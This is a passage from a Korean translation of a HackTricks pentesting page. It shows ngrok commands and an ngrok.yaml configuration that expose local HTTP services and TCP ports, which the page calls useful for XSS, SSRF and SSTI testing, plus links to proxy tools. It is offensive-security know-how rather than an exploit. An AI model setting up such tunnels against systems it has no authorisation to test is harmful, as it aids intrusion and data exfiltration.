*XSS, SSRF, SSTI에 유용합니다.*
stdout에서 직접 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서 확인할 수 있습니다.

#### 내부 HTTP 서비스 터널링
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예제

다음은 3개의 터널을 엽니다:
- 2개의 TCP
- /tmp/httpbin/에서 정적 파일 노출을 위한 1개의 HTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## 확인할 다른 도구들

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
